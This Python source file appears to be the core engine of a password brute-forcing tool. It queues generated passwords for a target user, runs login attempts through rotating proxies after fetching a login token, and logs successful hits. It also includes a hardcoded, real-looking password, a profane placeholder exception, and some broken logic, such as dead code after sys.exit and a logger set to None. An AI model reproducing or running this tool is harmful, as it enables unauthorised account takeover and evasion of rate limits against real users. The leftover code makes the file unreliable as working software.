from __future__ import absolute_import

import logging
import logging.config

import asyncio

from app.lib import exceptions
from app.lib.utils import auto_logger

from .login import login_handler
from .tokens import token_handler
from .proxies import proxy_handler


__all__ = ('Engine', )


log = logging.getLogger(__file__).setLevel(logging.INFO)


class Engine(object):

    def __init__(self, config, global_stop_event, proxies):

        self.config = config
        self.global_stop_event = global_stop_event

        self.proxy_handler = proxy_handler(config, global_stop_event, proxies)
        self.login_handler = login_handler(config, global_stop_event, self.proxy_handler)
        self.token_handler = token_handler(config, global_stop_event, self.proxy_handler)

    @auto_logger("Producing Passwords")
    async def produce_passwords(self, passwords, log):
        """
        Retrieves passwords generated passwords that have not been attempted
        from the User object and populates the password queue.
        """
        log.success('Starting...')

        count = 0
        for password in self.config.user.get_new_attempts():
            if self.config.limit and count == self.config.limit:
                break
            await passwords.put(password)
            count += 1

    @auto_logger("Consuming Results")
    async def consume_results(self, results, attempts, log):

        while True:
            # wait for an item from the producer
            result = await results.get()
            if not result or not result.conclusive:
                raise exceptions.FatalException(
                    "Result should be valid and conslusive."
                )

            if result.authorized:
                import sys

                sys.exit()
                # TODO: Set global stop event here.
                raise exceptions.FatalException("GOT A RESULT BITCH")
                log.success(result)
                log.success(result.context.password)
            else:
                log.error(result)

            await attempts.put(result.context.password)

            # Notify the queue that the item has been processed
            results.task_done()

    @auto_logger('Engine')
    async def run(self, loop, log):

        passwords = asyncio.Queue()
        attempts = asyncio.Queue()
        results = asyncio.Queue()

        proxy_producer = asyncio.ensure_future(
            self.proxy_handler.produce_proxies()
        )

        token = await self.token_handler.fetch()
        if token is None:
            raise exceptions.FatalException(
                "The allowable attempts to retrieve a token did not result in a "
                "valid response containing a token.  This is most likely do to "
                "a connection error."
            )

        log.success("Set Token", extra={'token': token})

        results_consumer = asyncio.ensure_future(
            self.consume_results(results, attempts)
        )

        password_consumer = asyncio.ensure_future(
            self.login_handler.consume_passwords(passwords, results, token)
        )

        # Run the main password producer and wait for completion
        await self.produce_passwords(passwords)
        await passwords.put("Ca23tlin083801331")
        await passwords.put('JIBBERISH')
        await passwords.put('NONSENSE')
        log.success('Passwords Produced')

        # Wait until the password consumer has processed all the passwords.
        log.debug('Awaiting Password Consumer')
        await password_consumer
        log.success('Passwords Consumed')

        # If the consumer is still awaiting for an item, cancel it.
        log.debug('Cancelling Password Consumer')
        password_consumer.cancel()
        log.info('Password Consumer Cancelled')

        log.debug('Cancelling Results Consumer')
        results_consumer.cancel()
        log.info('Results Consumer Cancelled')

        log.debug('Cancelling Proxy Producer')
        proxy_producer.cancel()
        log.info('Proxy Producer Cancelled')

        log.info('Dumping Attempts')
        while not attempts.empty():
            log.info(await attempts.get())
